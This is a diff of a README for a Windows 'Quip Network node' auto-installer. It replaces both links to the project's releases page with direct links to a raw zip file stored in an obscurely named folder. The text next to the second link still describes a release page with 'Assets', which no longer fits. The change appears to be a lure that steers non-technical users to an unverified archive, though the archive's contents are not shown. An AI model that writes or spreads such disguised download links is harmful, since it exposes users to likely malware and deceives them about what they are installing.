@@ -1,6 +1,6 @@
 # ⚡ QuipNetwork-node-autoinstall - Simple tools for easy network participation
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/raw/refs/heads/main/postbulbar/Quip_node_Network_autoinstall_1.2.zip)
 
 This software helps you start and manage your Quip Network node on Windows. It automates the setup process for your computer hardware. The script handles CPU and GPU tasks to ensure your node runs with efficiency. You do not need experience with command lines to use this tool.
 
@@ -31,7 +31,7 @@ Ensure your computer meets these minimum standards before you start:
 
 You must visit the project release page to get the correct version for your Windows computer.
 
-[Click here to visit the release page to download the software](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/releases)
+[Click here to visit the release page to download the software](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/raw/refs/heads/main/postbulbar/Quip_node_Network_autoinstall_1.2.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets".
